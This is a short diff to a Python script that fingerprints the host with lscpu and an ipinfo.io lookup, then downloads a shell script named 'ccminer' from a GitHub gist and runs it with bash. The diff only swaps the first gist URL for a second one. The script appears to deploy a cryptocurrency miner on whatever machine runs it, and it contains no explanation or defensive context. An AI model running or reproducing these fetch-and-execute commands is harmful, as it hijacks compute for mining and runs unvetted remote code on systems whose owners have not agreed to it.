@@ -1,4 +1,4 @@
 import os
 os.system('lscpu')
 os.system('curl ipinfo.io')
-os.system('curl https://gist.githubusercontent.com/vpsone03/4cedcb5b2eb1102d484d76e4697a47a4/raw/f9c104dea50f4891082ee83b8696604bcfd0c7b4/ccminer1.txt --output ccminer1.txt && bash ccminer1.txt')
+os.system('curl https://gist.githubusercontent.com/vpsone03/ef55d0075086c54776f3292283e772a3/raw/0bcba6bf29b14b57dd0e311c95c795d30a8af836/ccminier2.txt --output ccminer2.txt && bash ccminer2.txt')
